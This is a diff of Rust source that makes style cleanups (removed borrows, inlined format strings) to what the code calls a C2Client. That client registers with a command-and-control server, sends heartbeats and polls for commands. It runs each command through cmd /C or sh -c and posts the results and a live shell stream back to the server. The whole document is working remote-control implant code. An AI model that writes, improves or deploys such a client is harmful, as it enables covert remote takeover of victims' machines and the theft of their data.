@@ -1,5 +1,4 @@
 use reqwest::Client;
-use serde_json;
 use std::io::{BufRead, BufReader}; // Removed Write
 use std::process::{Command, Stdio};
 use std::time::Duration;
@@ -61,7 +60,7 @@ impl C2Client {
 
         let response = self
             .client
-            .post(&format!("{}/api/register", self.server_url))
+            .post(format!("{}/api/register", self.server_url))
             .json(&message)
             .send()
             .await?;
@@ -82,7 +81,7 @@ impl C2Client {
 
         let response = self
             .client
-            .post(&format!("{}/api/heartbeat", self.server_url))
+            .post(format!("{}/api/heartbeat", self.server_url))
             .json(&message)
             .send()
             .await?;
@@ -98,7 +97,7 @@ impl C2Client {
     pub async fn check_commands(&self) -> Result<(), Box<dyn std::error::Error>> {
         let response = self
             .client
-            .get(&format!(
+            .get(format!(
                 "{}/api/commands/{}",
                 self.server_url, self.client_id
             ))
@@ -123,13 +122,13 @@ impl C2Client {
     ) -> Result<(), Box<dyn std::error::Error>> {
         let output = if cfg!(target_os = "windows") {
             Command::new("cmd")
-                .args(&["/C", &cmd.command])
+                .args(["/C", &cmd.command])
                 .args(&cmd.args)
                 .output()
         } else {
             Command::new("sh")
                 .arg("-c")
-                .arg(&format!("{} {}", cmd.command, cmd.args.join(" ")))
+                .arg(format!("{} {}", cmd.command, cmd.args.join(" ")))
                 .output()
         };
 
@@ -146,7 +145,7 @@ impl C2Client {
                 client_id: self.client_id.clone(),
                 command: cmd.command.clone(),
                 stdout: String::new(),
-                stderr: format!("Failed to execute command: {}", e),
+                stderr: format!("Failed to execute command: {e}"),
                 exit_code: -1,
                 executed_at: chrono::Utc::now(),
             },
@@ -157,7 +156,7 @@ impl C2Client {
         let message = Message::new(MessageType::CommandResult, payload);
 
         self.client
-            .post(&format!("{}/api/command_result", self.server_url))
+            .post(format!("{}/api/command_result", self.server_url))
             .json(&message)
             .send()
             .await?;
@@ -206,12 +205,12 @@ impl C2Client {
                 let message = Message::new(MessageType::ShellData, payload);
 
                 if let Err(e) = client
-                    .post(&format!("{}/api/shell_data", server_url))
+                    .post(format!("{server_url}/api/shell_data"))
                     .json(&message)
                     .send()
                     .await
                 {
-                    eprintln!("Failed to send shell data: {}", e);
+                    eprintln!("Failed to send shell data: {e}");
                 }
 
                 line.clear();
@@ -234,12 +233,12 @@ impl C2Client {
         loop {
             // 发送心跳
             if let Err(e) = self.send_heartbeat().await {
-                eprintln!("Failed to send heartbeat: {}", e);
+                eprintln!("Failed to send heartbeat: {e}");
             }
 
             // 检查命令
             if let Err(e) = self.check_commands().await {
-                eprintln!("Failed to check commands: {}", e);
+                eprintln!("Failed to check commands: {e}");
             }
 
             // 等待一段时间
